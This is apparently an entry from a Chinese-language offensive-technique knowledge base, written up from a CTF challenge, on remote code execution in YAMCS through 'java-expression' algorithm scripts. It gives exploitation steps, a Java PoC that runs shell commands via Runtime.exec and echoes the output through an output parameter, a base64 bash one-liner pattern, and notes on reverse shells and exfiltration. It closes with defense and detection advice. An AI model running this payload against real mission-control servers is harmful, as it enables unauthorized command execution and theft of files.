---
id: web-java-component-yamcs-algorithm-java-expression-rce
title: YAMCS 算法脚本 java-expression 注入：Runtime.exec 执行并用输出参数回显
type: scenario
domain: web
path: web/java/component
technique: yamcs-algorithm-java-expression-rce
aliases:
- YAMCS 算法注入
- java-expression
- out0.setStringValue
- YAMCS RCE
tags:
- web
- java
- yamcs
- expression-injection
- rce
- command-execution
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V202
  verified_at: '2026-11-07T02:02:45+08:00'
  notes: 已对照原文与图 22-24 核对：Algorithm java-expression、Runtime.exec、out0.setStringValue 回显、base64 命令一致；未复跑目标。
---

## 一句话结论

YAMCS 的算法（Algorithm）支持 `java-expression` 语言，算法 `Text` 字段会被当作 Java 表达式/语句执行；能编辑算法的人可写入 `Runtime.getRuntime().exec(...)` 直接 RCE。若命令无直接回显，可把输出写入输出参数 `out0.setStringValue(...)`，再从参数历史/Display 读取。

## 原理

- YAMCS 是任务控制框架，算法由脚本引擎在服务端 JVM 内求值；`java-expression` 语言能访问 Java 类与方法，未做沙箱隔离。`Text` 字段本身就是代码，保存后按触发器（如 `OnParameterUpdate`）执行。
- 默认示例 `out0.setFloatValue(in.getEngValue().getFloatValue())` 说明输入参数 `in` 与输出参数 `out0` 在表达式上下文中可用；因此攻击者可以执行任意 Java 代码，并把命令输出写回 `out0`。
- 若目标不出网，反弹 shell 失败；可执行 `bash -c '{echo,<base64>}|{base64,-d}|{bash,-i}'` 或 `cat /flag | base64`，把结果 `setStringValue` 到参数，再在 `Historical data` 页面读取。
- 该问题的本质是“有权限编辑算法 = 服务端代码执行”，属于功能滥用/缺少沙箱，而非内存漏洞。

## 触发条件

- 攻击者能访问 YAMCS Web 界面并编辑/创建算法（默认需要一定权限；弱口令、未授权访问或被 SSRF 到内网 YAMCS 都可能满足）。
- 算法语言可选 `java-expression`（或其它脚本语言），服务端未禁用 `Runtime`/`ProcessBuilder`/反射。
- 有一个可写的输出参数用于回显；或目标可出网，可反弹 shell。

## 利用步骤

1. 进入目标项目的 `Algorithms` 页面，新建或复制一个算法，`Language` 选 `java-expression`。
2. 在 `Text` 中写 Java 代码：执行命令，读取 stdout，写入 `out0.setStringValue(...)`。
3. 保存并触发算法（修改输入参数触发 `OnParameterUpdate`，或手动运行）。
4. 在 `Parameters → 输出参数 → Historical data` 查看回显；若用参数更新触发，先修改输入参数。
5. 无回显时把命令输出 base64 后写回，避免特殊字符破坏 XML/JSON/页面。

## PoC

```java
try {
    Process p = Runtime.getRuntime().exec(new String[]{
        "bash", "-c", "cat /flag | base64"
    });
    java.io.BufferedReader br = new java.io.BufferedReader(
        new java.io.InputStreamReader(p.getInputStream()));
    out0.setStringValue(br.readLine());
} catch (Exception e) {
    out0.setStringValue(e.toString());
}
```

先用 `Runtime.getRuntime().exec("touch /tmp/123")` 或 `out0.setStringValue("aaa")` 验证执行与回显通道，再换成读文件/命令执行。

## 变体与关联

- **其它表达式引擎**：SpEL/OGNL/MVEL/EL 注入的利用面与沙箱绕过不同；见 [[web-java-expression-spel-injection-to-rce]]、[[web-java-expression-el-injection-waf-bypass-scanner-echo]]。
- **YAMCS 其它功能**：命令行下发、参数脚本、Display 脚本等若接受用户脚本，同样可执行代码；审计所有“脚本/表达式”入口。
- **无回显外带**：写输出参数（本题）、写日志/文件、DNS/HTTP 出网；结合目标网络策略选择。
- **权限链**：若算法编辑需要登录，可先找默认口令/未授权 API，再进入该功能。

## 检测与防御

- 算法编辑只授予可信管理员，审计所有算法变更；禁止普通用户创建/修改脚本。
- 使用沙箱化表达式上下文（白名单类/方法），禁用 `Runtime`、`ProcessBuilder`、反射与 `T(...)` 访问。
- YAMCS 以最小权限运行，限制其可读文件与出网；对命令执行/子进程做告警。
- 检测：算法 `Text` 中出现 `Runtime`/`ProcessBuilder`/`exec`/`getInputStream` 等关键字，参数历史中出现 base64/命令输出。
